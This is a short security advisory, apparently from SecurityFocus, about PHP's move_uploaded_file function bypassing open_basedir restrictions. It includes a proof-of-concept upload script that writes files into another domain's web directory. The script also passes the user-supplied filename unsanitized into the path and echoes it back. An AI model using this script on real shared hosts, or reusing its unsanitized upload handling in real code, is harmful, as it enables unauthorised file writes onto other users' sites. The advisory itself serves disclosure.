source: http://www.securityfocus.com/bid/4325/info

PHP is a server side scripting language, designed to be embedded within HTML files. It is available for Windows, Linux, and many Unix based operating systems. It is commonly used for web development, and is very widely deployed.

It has been reported that the move_uploaded_file function lacks an open_basedir check. The effect of this issue is that this function may be used to perform file operations on directories outside of those specified by the open_basedir setting.

This vulnerability may not be exploited to overwrite existing files. 

<?

$file = $HTTP_POST_FILES['file']['name'];
$type = $HTTP_POST_FILES['file']['type'];
$size = $HTTP_POST_FILES['file']['size'];
$temp = $HTTP_POST_FILES['file']['tmp_name'];

$size_limit = "100000"; // set size limit in bytes

if ($file){
if ($size < $size_limit){

move_uploaded_file($temp,
"/domains/somebodyelse.org/public_html/www/test/".$file);
echo "The file <tt>$file</tt> was sucessfully
uploaded";
} else {
echo "Sorry, your file exceeds the size limit of $size_limit
bytes";
}}

echo "
<form enctype='multipart/form-data' action=$PHP_SELF method=post>
Upload a file: <input name='file' type='file'>
<input type='submit' value='Upload'>
</form>
";
?>